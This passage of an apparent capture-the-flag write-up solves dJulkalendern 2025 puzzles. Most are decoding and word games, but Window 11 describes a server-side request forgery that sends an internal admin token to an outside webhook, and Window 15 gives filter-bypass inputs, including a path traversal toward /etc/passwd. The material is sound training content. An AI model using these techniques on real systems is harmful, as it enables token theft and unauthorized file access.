+is the word <code>POSITIVE</code>.</p><h2 class="relative group">Window 3: Dankan’s Telephone Must Function<div id=window-3-dankans-telephone-must-function class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-3-dankans-telephone-must-function aria-label=Anchor>#</a></span></h2><p>We are presented with an audio file and the suspicious keyword &ldquo;DTMF&rdquo;. To no
+surprise a portion of the file includes
+<a href=https://en.wikipedia.org/wiki/DTMF_signaling target=_blank>DTMF</a> encoded audio. Passing the
+file through a <a href=https://dtmf.netlify.app/ target=_blank>DTMF audio file decoder</a> outputs the
+decoded <code>224447773555444633</code>.</p><pre tabindex=0><code>[...]
+0031s .........................
+0032s .........................
+0033s ...................222222
+0034s 2222.......2222222222....
+0035s ...4444444444........4444
+0036s 44444........444444444...
+0037s .....777777777........777
+0038s 777777........777777777..
+0039s ......3333333333.......55
+0040s 55555555.......5555555555
+0041s .......5555555555.......4
+0042s 444444444.......444444444
+0043s 4........444444444.......
+0044s .666666666........3333333
+0045s 33........333333333......
+0046s .........................
+0047s .........................
+0048s .........................
+0049s .........................
+0050s .........................
+0051s .........................
+0052s .......
+
+Decoded: 224447773555444633
+</code></pre><p>In this context specifically, these numbers look like what you would type to
+form words on your old T9 layout phone. Sure enough, passing it through a
+<a href=https://www.dcode.fr/multitap-abc-cipher target=_blank>Multi-Tap decoder</a> produces the word
+<code>BIRDLIME</code>, which is the solution to the challenge.</p><h2 class="relative group">Window 4: Crouching duck, hidden message<div id=window-4-crouching-duck-hidden-message class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-4-crouching-duck-hidden-message aria-label=Anchor>#</a></span></h2><p>The story hints a lot towards WW2 and aerospace dictionaries, with some more
+specific hints such as the &ldquo;control room <em>Sierra-Delta-Echo</em>&rdquo; and the fact that
+they&rsquo;re spelling mic/microphone as &ldquo;<em>mike</em>&rdquo;. This all points towards the
+significance of some a phonetic alphabet. I here learned that there are
+<a href=https://en.wikipedia.org/wiki/Spelling_alphabet target=_blank>lots of different phonetic alphabets</a>,
+but since Winston Churchill makes an appearance in the story the most likely one
+was <a href=https://saconavy.net/history/wwii-phonetic-alphabet/ target=_blank>the 1943 WW2 CCB</a>.</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="Window 3 phonetic alphabet (WW2 CCB) highlights" width=942 height=833 src=/posts/djul-writeup-2025/img/window3_helium_hu14711070130440113454.png srcset="/posts/djul-writeup-2025/img/window3_helium_hu14711070130440113454.png 800w, /posts/djul-writeup-2025/img/window3_helium.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window3_helium.png></figure><p>If you mark all mentions of a WW2 CCB word in the challenge text you will find,
+in order of appearance: &ldquo;how&rdquo;, &ldquo;easy&rdquo;, &ldquo;love&rdquo;, &ldquo;item&rdquo;, &ldquo;uncle&rdquo;, &ldquo;mike&rdquo;. This
+spells out the challenge solution <code>HELIUM</code>.</p><h2 class="relative group">Window 5: Times for delivery<div id=window-5-times-for-delivery class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-5-times-for-delivery aria-label=Anchor>#</a></span></h2><p>Each challenge that is released on a Friday is traditionally a
+<a href=https://en.wikipedia.org/wiki/Multi-user_dungeon target=_blank>MUD</a> in dJulkalendern and
+this year was no exception. The challenge greets us with an image of dAnkan
+playing wordle, and connecting to the MUD reveals that we will too!</p><pre tabindex=0><code>:::::::::  ::::::::::: :::    ::: :::        ::::    ::::  :::    ::: :::::::::
+:+:    :+:     :+:     :+:    :+: :+:        +:+:+: :+:+:+ :+:    :+: :+:    :+:
++:+    +:+     +:+     +:+    +:+ +:+        +:+ +:+:+ +:+ +:+    +:+ +:+    +:+
++#+    +:+     +#+     +#+    +:+ +#+        +#+  +:+  +#+ +#+    +:+ +#+    +:+
++#+    +#+     +#+     +#+    +#+ +#+        +#+       +#+ +#+    +#+ +#+    +#+
+#+#    #+# #+# #+#     #+#    #+# #+#        #+#       #+# #+#    #+# #+#    #+#
+#########   #####       ########  ########## ###       ###  ########  #########  ₂.₀
+
+Mysterious voice: What is your name?
+&gt;bk
+Welcome bk! Use `help` for a list of commands.
+
+[*] Write a 5 letter word using &#34;guess &lt;word&gt;&#34;!:
+help
+Available commands:
+    togglechat (join/leave chat room)
+    say &lt;msg&gt; (send a message in the chat room)
+    guess &lt;word&gt; (guesses the word)
+    retry  (restarts the current wordle challenge)
+    reset  (resets back to the first wordle)
+</code></pre><p>First, there&rsquo;s a regular wordle puzzle. Simple trial and error and the help of a
+<a href=https://www.regexdictionary.com target=_blank>RegEx dictionary</a> let&rsquo;s you pass this stage
+rather easily.</p><pre tabindex=0><code>[*] Write a 5 letter word using &#34;guess &lt;word&gt;&#34;!:
+guess crane
+=====
+....Y
+guess tales
+=====
+..YYG
+guess elves
+=====
+YG..G
+guess blues
+=====
+.G.YG
+guess sleds
+=====
+GGGGG
+You did it! Onto the next challenge
+</code></pre><p>The second stage is a wordle puzzle variation where we begin with a partial
+solve:</p><pre tabindex=0><code>The word danka has GGGGG
+Make your word match GG.Y.
+</code></pre><p>Here the RegEx dictionary really comes in handy, since it can quickly
+<a href="https://www.regexdictionary.com/regex?r=%5eda[%5edank][dank][%5edank]%24" target=_blank>reveal all words that match the setup</a>.
+There aren&rsquo;t that many so it could&rsquo;ve been a bit of a pain to do by hand. Not
+all dictionary hits are accepted as real words by the MUD, but that&rsquo;s not an
+issue when you have a list of many more to try.</p><p>The third and final stage was another wordle variation, this time actually
+making it more difficult than a regular wordle puzzle. The prompt for this stage
+is as follows:</p><pre tabindex=0><code>Letters are skyscrapers - a large scraper may obscure smaller ones behind it.
+</code></pre><p>I found this very cryptic and while the feedback after a guess showed that some
+information was indeed obscured I couldn&rsquo;t quite figure out the rule behind it.
+I ended up solving it with trial and error like with a regular wordle puzzle,
+just with less information to go off of. Here I also used a
+<a href=https://www.wordcheats.com/wordle-solver target=_blank>wordle solver</a> as help.</p><pre tabindex=0><code>guess lance
+.....
+=====
+guess hurts
+?.YYY
+=====
+guess stork
+Y????
+=====
+guess strip
+Y?Y??
+=====
+guess trips
+Y???Y
+=====
+guess first
+??Y?G
+=====
+guess frost
+????G
+You did it! The word is:
+   /$$     /$$                                                             /$$
+  | $$    | $$                                                            |__/
+ /$$$$$$  | $$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$/$$$$   /$$$$$$  /$$$$$$$  /$$  /$$$$$$
+|_  $$_/  | $$__  $$ /$$__  $$ /$$__  $$| $$_  $$_  $$ |____  $$| $$__  $$| $$ |____  $$
+  | $$    | $$  \ $$| $$$$$$$$| $$  \ $$| $$ \ $$ \ $$  /$$$$$$$| $$  \ $$| $$  /$$$$$$$
+  | $$ /$$| $$  | $$| $$_____/| $$  | $$| $$ | $$ | $$ /$$__  $$| $$  | $$| $$ /$$__  $$
+  |  $$$$/| $$  | $$|  $$$$$$$|  $$$$$$/| $$ | $$ | $$|  $$$$$$$| $$  | $$| $$|  $$$$$$$
+   \___/  |__/  |__/ \_______/ \______/ |__/ |__/ |__/ \_______/|__/  |__/|__/ \_______/
+</code></pre><p>It was later revealed in the dJulkalendern Discord server that the skyscraper
+part was &ldquo;inspired by
+<a href=https://sudokubliss.com/guides/sudoku-skyscraper target=_blank>skyscraper clues in variant sudoku</a>&rdquo;.
+Essentially, if you guess the letter &lsquo;p&rsquo; in the first position then every
+subsequent first position guess with any lower letter (a-o) will be obscured.
+The &ldquo;intended&rdquo; way to solve it was to guess words with only letters from the
+beginning of the alphabet first and the progress further through the alphabet
+with each guess, extracting the required information while being careful of
+blocking the view in future guesses:</p><pre tabindex=0><code>Letters are skyscrapers - a large scraper may obscure smaller ones behind it.
+=====
+guess abaca
+.....
+=====
+guess effed
+.Y...
+=====
+guess minim
+.....
+=====
+guess sport
+Y.GYG
+=====
+guess frost
+?GGGG
+You did it!
+</code></pre><p>Nonetheless, after solving the third and final stage you were presented with the
+solution to this challenge, <code>THEOMANIA</code>.</p><h2 class="relative group">Window 8: Something is rotten in the state of Norway<div id=window-8-something-is-rotten-in-the-state-of-norway class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-8-something-is-rotten-in-the-state-of-norway aria-label=Anchor>#</a></span></h2><p>This challenge was quite straight forward. You are given a file <code>norsk_jul.docx</code>
+and some hints that stand out: we ask &ldquo;what type of file is it?&rdquo; and the last
+thing in the story is dAnkan saying &ldquo;If only they had left a comment &mldr;&rdquo;.</p><p>Using <code>file</code> shows that it is actually a zip file. We unzip and notice that most
+files are xml, so we can recursively search for xml comments in the unpacked
+directory using grep and find the sought word <code>HELICOPTER</code>.</p><pre tabindex=0><code>$ file norsk_jul.docx
+norsk_jul.docx: Zip archive data, at least v2.0 to extract, compression method=store
+$ unzip norsk_jul.docx
+Archive:  norsk_jul.docx
+   creating: pg1524/
+   creating: pg1524/docProps/
+  inflating: pg1524/docProps/app.xml
+  inflating: pg1524/docProps/core.xml
+   creating: pg1524/word/
+  inflating: pg1524/word/document.xml
+  inflating: pg1524/word/fontTable.xml
+  inflating: pg1524/word/settings.xml
+  inflating: pg1524/word/styles.xml
+   creating: pg1524/word/theme/
+  inflating: pg1524/word/theme/theme1.xml
+  inflating: pg1524/word/webSettings.xml
+   creating: pg1524/word/_rels/
+  inflating: pg1524/word/_rels/document.xml.rels
+  inflating: pg1524/[Content_Types].xml
+   creating: pg1524/_rels/
+  inflating: pg1524/_rels/.rels$ unzip norsk
+$ grep -zro &#39;&lt;!--.*--&gt;&#39; pg1524
+pg1524/word/document.xml:&lt;!--
+What the hell? This is just a ZIP??
+
+This is your solution word: helicopter
+
+Also check out this BANGER: https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;pp=ygUJUmljayByb2xs
+--&gt;
+</code></pre><h2 class="relative group">Window 9: No mom, I can’t pause<div id=window-9-no-mom-i-cant-pause class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-9-no-mom-i-cant-pause aria-label=Anchor>#</a></span></h2><p>The challenge greets us with a screenshot showing dAnkan playing the game
+Counter-Strike 2 on their steam account. He rambles about 10 clues that lead to
+the ID of an unlisted picture. The story also mentions adding numbers on several
+occasions. That&rsquo;s about all the clues needed to solve this challenge!</p><p>Finding <a href=https://steamcommunity.com/id/dJulkalendern target=_blank>dAnkans steam account</a> was
+a simple as searching for &ldquo;dAnkan&rdquo;. The profile info instantly looks
+suspiciously like a clue.<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="Window 9 steam profile info clue" width=688 height=400 src=/posts/djul-writeup-2025/img/window9_info.png srcset="/posts/djul-writeup-2025/img/window9_info.png 800w, /posts/djul-writeup-2025/img/window9_info.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window9_info.png></figure></p><p>Poking around you start to see more interesting numbers, for example in the
+friends section and in the profile comments.<figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="Window 9 steam profile friends clue" width=300 height=115 src=/posts/djul-writeup-2025/img/window9_friends.png srcset="/posts/djul-writeup-2025/img/window9_friends.png 800w, /posts/djul-writeup-2025/img/window9_friends.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window9_friends.png></figure><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="Window 9 steam profile comments clue" width=664 height=235 src=/posts/djul-writeup-2025/img/window9_comments.png srcset="/posts/djul-writeup-2025/img/window9_comments.png 800w, /posts/djul-writeup-2025/img/window9_comments.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window9_comments.png></figure></p><p>There are a total of 10 of these numbers located throughout the steam profile
+and related steam pages. Rather than describing exactly where all are found I&rsquo;ll
+provide a summary table below.</p><table><thead><tr><th>Location</th><th>Clue</th></tr></thead><tbody><tr><td>info</td><td>161803398</td></tr><tr><td>comments</td><td>602135790</td></tr><tr><td>friends</td><td>350987654</td></tr><tr><td>screenshots</td><td>314159265</td></tr><tr><td>videos</td><td>455</td></tr><tr><td>reviews</td><td>199999999</td></tr><tr><td>guides</td><td>271828182</td></tr><tr><td>group discussions</td><td>779451967</td></tr><tr><td>group event</td><td>512345678</td></tr><tr><td>inventory</td><td>423000111</td></tr></tbody></table><p>The inventory clue was the one I found the hardest to spot. It was one of the
+first places I checked but I quickly disregarded it since it only had one item
+and I saw no numbers. Turns out the clue was there all along, hidden in the
+custom name tag of the item.</p><p>Summing all 10 clue numbers and using it as a steam picture ID reveals
+<a href="https://steamcommunity.com/sharedfiles/filedetails/?id=3615712499" target=_blank>the unlisted image spoken of</a>.
+This leads to the solution to the challenge, <code>CHAINSAW</code>.</p><h2 class="relative group">Window 10: dAnkan, we have to cook<div id=window-10-dankan-we-have-to-cook class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-10-dankan-we-have-to-cook aria-label=Anchor>#</a></span></h2><p>Mostly everything needed to solve this challenge is in the included image below.
+On the left side there seems to be some kind of circuit with binary encoding,
+and the right side contains a portrait of dAnkan.</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="Window 10 cover image" width=874 height=845 src=/posts/djul-writeup-2025/img/window10_morse_hu7983794773910555346.png srcset="/posts/djul-writeup-2025/img/window10_morse_hu7983794773910555346.png 800w, /posts/djul-writeup-2025/img/window10_morse.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window10_morse.png></figure><p>Throughout the story dAnkan draws a lot of attention to the 4-colored background
+of his portrait. There&rsquo;s also a mention of pipettes, hinting towards the use of
+a color picker. The four background-colors are (in RGB hex): <code>#A8AE3B</code>,
+<code>#A2E2E8</code>, <code>#BBA2EA</code> and <code>#2B8EE0</code>. In binary:</p><pre tabindex=0><code>0xA8AE3B: 101010001010111000111011
+0xA2E2E8: 101000101110001011101000
+0xBBA2EA: 101110111010001011101010
+0x2B8EE0: 001010111000111011100000
+</code></pre><p>Towards the end of the story dAnkan says <em>&ldquo;I have never felt despair this
+analog, so floating. The signals she sends to me through this ancient medium
+tumbles me into a deep duck-pression…&rdquo;</em> The ancient analog medium is likely a
+hint towards morse code, explaining the circuit in the left of the image.</p><p>Interpreting the binary (all concatenated) as morse following
+<a href=https://morsecode.world/international/timing/ target=_blank>the correct timing</a> and where a
+0 means open circuit and 1 means closed circuit, we get</p><pre tabindex=0><code>... ..- --. .- .-. .--. .-.. ..- --
+</code></pre><p>which is morse for <code>SUGARPLUM</code>, the solution to the challenge.</p><h2 class="relative group">Window 11: Reeling in the secrets<div id=window-11-reeling-in-the-secrets class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-11-reeling-in-the-secrets aria-label=Anchor>#</a></span></h2><p>This challenge links to a website (&ldquo;Christmas Photo Framer&rdquo;) where you enter a
+photo URL and select a festive holiday frame to add to it. The task is to
+authenticating as admin and selecting the unavailable VIP picture frame.</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="Christmas Photo Framer landing page" width=1329 height=901 src=/posts/djul-writeup-2025/img/window11_photo_framer_hu7570012461098147539.png srcset="/posts/djul-writeup-2025/img/window11_photo_framer_hu7570012461098147539.png 800w, /posts/djul-writeup-2025/img/window11_photo_framer_hu6108198784939359538.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window11_photo_framer.png></figure><p>Trying to access the admin or support page returns this error:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;error&#34;</span><span class=p>:</span> <span class=s2>&#34;Forbidden&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;You need to use the correct version of the internal browser to access the page. Please make sure you have the latest version.&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>The challenge&rsquo;s story mentions <em>user agent</em>, the secret agents <em>Web</em> and <em>Hook</em>,
+the existence of a <em>token</em>, and dressing up to convince someone you&rsquo;re one of
+them.</p><p>We can easily set up a webhook with
+<a href=https://webhook.site target=_blank>https://webhook.site</a>. Supplying the webhook URL to be
+framed by Christmas Photo Framer then shows the GET request from the server.</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="GET request from Christmas Photo Framer" width=1088 height=169 src=/posts/djul-writeup-2025/img/window11_webhook_hu706804247922702522.png srcset="/posts/djul-writeup-2025/img/window11_webhook_hu706804247922702522.png 800w, /posts/djul-writeup-2025/img/window11_webhook.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window11_webhook.png></figure><p>If we set our own user-agent to that of the server
+(<code>NorthPoleExplorer/7.17.4711-advent-3+sleighride.3990730628992603</code>) we can
+access the admin page, but it tells us we have to authenticate as admin first.</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="Admin login page" width=1319 height=611 src=/posts/djul-writeup-2025/img/window11_admin_login_hu1818928223093351711.png srcset="/posts/djul-writeup-2025/img/window11_admin_login_hu1818928223093351711.png 800w, /posts/djul-writeup-2025/img/window11_admin_login_hu11736102147920569638.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window11_admin_login.png></figure><p>The login button redirects to the user to</p><p><code>elf-identity.internal:4000/auth?callback=http%3A%2F%2Fphotoframe.hackfest.lol%2Flogin</code></p><p>The support page, also accessible with the new user-agent, explains that you
+have to be connected to the internal network to authenticate as admin. We are
+not, but we know that the web server likely is!</p><p>We can trick the web server to authenticate for us by simply supplying the
+<code>self-identity.internal</code> URL for framing. With our own webhook as callback we
+can catch the response from the authentication server. Said and done, framing</p><p><code>http://elf-identity.internal:4000/auth?callback=https%3A%2F%2Fwebhook.site%&lt;id></code></p><p>shows that this GET request was made:</p><p><code>https://webhook.site/&lt;id>?token=secret_santa_54N7AoFi53LFBuO3QjdJKN0R7HP0L3KKNLakcxR31nD33R70Y5i15N0WKCTzkN</code></p><p>It looks like the internal identity checker is supposed to hook back to</p><p><code>http://photoframe.hackfest.lol/login?token=secret_santa_54N7AoFi53LFBuO3QjdJKN0R7HP0L3KKNLakcxR31nD33R70Y5i15N0WKCTzkN</code></p><p>If we visit this address we have successfully circumvented the authentication,
+allowing us to use the VIP frame.</p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="VIP frame and flag" width=540 height=859 src=/posts/djul-writeup-2025/img/window11_vip_frame.png srcset="/posts/djul-writeup-2025/img/window11_vip_frame.png 800w, /posts/djul-writeup-2025/img/window11_vip_frame.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window11_vip_frame.png></figure><p>This reveals the solution <code>STROBOSCOPE</code>.</p><h2 class="relative group">Window 12: All aboard the number train<div id=window-12-all-aboard-the-number-train class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-12-all-aboard-the-number-train aria-label=Anchor>#</a></span></h2><p>MUD friday again! This time you have to solve Soduko-like puzzles:</p><pre tabindex=0><code>YOUR STACK [4, 1, 2, 3, 1, 4, 3, 2, 4, 1, 3, 4, 2, 3, 1, 2]
+
++---+---+---+---+
+|   |   |   |   |
++---+---+---+---+
+|   |   |   |   | E
++---+---+---+---+
+|   | X |   |   |
++---+---+---+---+
+|   |   |   |   |
++---+---+---+---+
+</code></pre><p>You are the <code>X</code> and have to make your way to the exit <code>E</code>. At each step that is
+taken, the first number in the stack is placed in the square you just moved
+from. The task is to reach the exit by walking the correct path; the path such
+that the stack is empty and each row and column contain no duplicate numbers
+when you reach the exit.</p><p>There&rsquo;s not much more to it than thinking ahead and/or finding the correct path
+through trial and error. There are a total of three puzzles to complete, which
+you do by walking the paths shown below.</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="Solution path for puzzle 1" width=196 height=176 src=/posts/djul-writeup-2025/img/window12_puzzle1.png srcset="/posts/djul-writeup-2025/img/window12_puzzle1.png 800w, /posts/djul-writeup-2025/img/window12_puzzle1.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window12_puzzle1.png></figure><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="Solution path for puzzle 2" width=196 height=176 src=/posts/djul-writeup-2025/img/window12_puzzle2.png srcset="/posts/djul-writeup-2025/img/window12_puzzle2.png 800w, /posts/djul-writeup-2025/img/window12_puzzle2.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window12_puzzle2.png></figure><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=auto alt="Solution path for puzzle 3" width=274 height=255 src=/posts/djul-writeup-2025/img/window12_puzzle3.png srcset="/posts/djul-writeup-2025/img/window12_puzzle3.png 800w, /posts/djul-writeup-2025/img/window12_puzzle3.png 1280w" sizes="(min-width: 768px) 50vw, 65vw" data-zoom-src=/posts/djul-writeup-2025/img/window12_puzzle3.png></figure></p><p>Completing the last puzzle shows the sought word <code>THALPOSIS</code>.</p><h2 class="relative group">Window 14: Time for some Feedback<div id=window-14-time-for-some-feedback class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-14-time-for-some-feedback aria-label=Anchor>#</a></span></h2><p>This challenge is no challenge, just a feedback form for the first half of the
+event that is not scored. Completing the form gives you the word
+<code>SPORTSMANSHIP</code>.</p><h2 class="relative group">Window 15: Bricking towers and charming snakes<div id=window-15-bricking-towers-and-charming-snakes class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#window-15-bricking-towers-and-charming-snakes aria-label=Anchor>#</a></span></h2><p>This challenge presents you with 7 different input sanitation functions, each of
+which you have to bypass somehow.</p><ol><li><p>forbidden</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl> <span class=k>def</span> <span class=nf>forbidden</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>     <span class=n>text</span> <span class=o>=</span> <span class=n>text</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;secret&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>     <span class=k>return</span> <span class=s2>&#34;secret&#34;</span> <span class=ow>in</span> <span class=n>text</span>
+</span></span></code></pre></div><p>The input <code>ssecretecret</code> will return true here.</p></li><li><p>no_numbers_thanks</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>no_numbers_thanks</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>text</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;1337&#34;</span><span class=p>)</span> <span class=ow>or</span> <span class=n>text</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=s2>&#34;1337&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;I said no numbers!&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>text</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1337</span>
+</span></span></code></pre></div><p>Both <code>1_337</code> and <code>1337</code> works here.</p></li><li><p>no_really_no_numbers</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>no_really_no_numbers</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;1337&#34;</span> <span class=ow>in</span> <span class=n>text</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;boo!&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>text</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1337</span>
+</span></span></code></pre></div><p>Here <code>1_337</code> works fine.</p></li><li><p>christmas_time</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>christmas_time</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>fullmatch</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;^djulkalendern$&#34;</span><span class=p>,</span> <span class=n>text</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>re</span><span class=o>.</span><span class=n>IGNORECASE</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>m</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Bad bad, don&#39;t try to sneak past&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>text</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span> <span class=o>==</span> <span class=s2>&#34;djulkalendern&#34;</span>
+</span></span></code></pre></div><p>This one was more interesting I think! Apparently the kelvin symbol <code>K</code>
+becomes <code>k</code> when made into lowercase. So <code>djulKalendern</code> (with kelvin symbol)
+will bypass the regex check and return true.</p></li><li><p>path_poo_poo</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>path_poo_poo</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>remove_dots</span><span class=p>(</span><span class=n>part</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>re</span><span class=o>.</span><span class=n>sub</span><span class=p>(</span><span class=s2>&#34;^[. </span><span class=se>\t\r\n</span><span class=s2>]+&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=n>part</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>path_parts</span> <span class=o>=</span> <span class=n>text</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># protect against path traversal</span>
+</span></span><span class=line><span class=cl>    <span class=n>path_parts</span> <span class=o>=</span> <span class=p>[</span><span class=n>remove_dots</span><span class=p>(</span><span class=n>part</span><span class=p>)</span> <span class=k>for</span> <span class=n>part</span> <span class=ow>in</span> <span class=n>path_parts</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>path</span> <span class=o>=</span> <span class=s2>&#34;/&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>path_parts</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>base</span> <span class=o>=</span> <span class=s2>&#34;/zeus/hera/perseus/&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>full_path</span> <span class=o>=</span> <span class=n>base</span> <span class=o>+</span> <span class=n>path</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;full_path&#34;</span><span class=p>,</span> <span class=n>full_path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>normpath</span><span class=p>(</span><span class=n>full_path</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;/etc/passwd&#34;</span>
+</span></span></code></pre></div><p>This one took me the longest but we can simply input <code>../ ../ ../etc/passwd</code>,
